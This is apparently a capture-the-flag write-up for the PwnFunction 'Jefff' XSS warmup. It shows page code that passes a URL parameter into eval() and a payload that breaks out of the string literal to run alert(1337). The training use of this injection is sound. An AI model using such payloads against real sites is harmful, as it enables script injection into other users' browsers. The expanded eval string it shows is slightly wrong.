# Jefff - Exercise 2

[Problem](https://xss.pwnfunction.com/warmups/jefff/)

[Solution](https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=hello%22%3Balert(1337)%3Bvar%20hi%20=%20%22hello)

## Explanation

Here is the part to inject JS

```html
<h2 id="maname"></h2>
<script>
    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
    let ma = ""
    eval(`ma = "Ma name ${jeff}"`)
    setTimeout(_ => {
        maname.innerText = ma
    }, 1000)
</script>
```

Notice that there is a *eval()* function being called which uses a parameter *jeff* (or *JEFFF*). Thus provide a value for jeff such that you can an additional alert statement.
set jeff with `hello"%3Balert(1337)%3Bvar hi = "hello`. Then the eval function will be called with input `ma = "Ma name hello";alert(1337);var hi = hello`. Three statements (each seperated with a semicolon are executed)

### This might be useful

- [Evaluating Multiple Parameters in JS](https://iq.js.org/questions/javascript/how-to-evaluate-multiple-expressions-in-one-line)
- %3B is the HTML URL Encoding for semicolon
